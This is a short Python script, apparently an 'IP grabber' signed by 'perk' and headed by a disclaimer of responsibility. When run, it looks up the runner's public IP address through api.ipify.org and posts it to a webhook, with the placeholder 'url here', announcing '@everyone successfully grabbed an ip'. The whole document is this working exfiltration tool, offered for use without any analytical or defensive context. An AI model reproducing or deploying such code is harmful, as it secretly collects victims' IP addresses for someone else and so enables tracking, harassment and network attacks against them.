################################################################
# im not responsible for anything that happens with this code  #
#                         made by perk                         #
################################################################


import requests

def grab():
    getip = requests.get('https://api.ipify.org?format=json')
    ip_data = getip.json()
    return ip_data['ip']

def message(webhook, ip):
    payload = {'content': f'@everyone successfully grabbed an ip: {ip}'}
    requests.post(webhook, json=payload)

webhook = 'url here'
ip = grab()
message(webhook, ip)
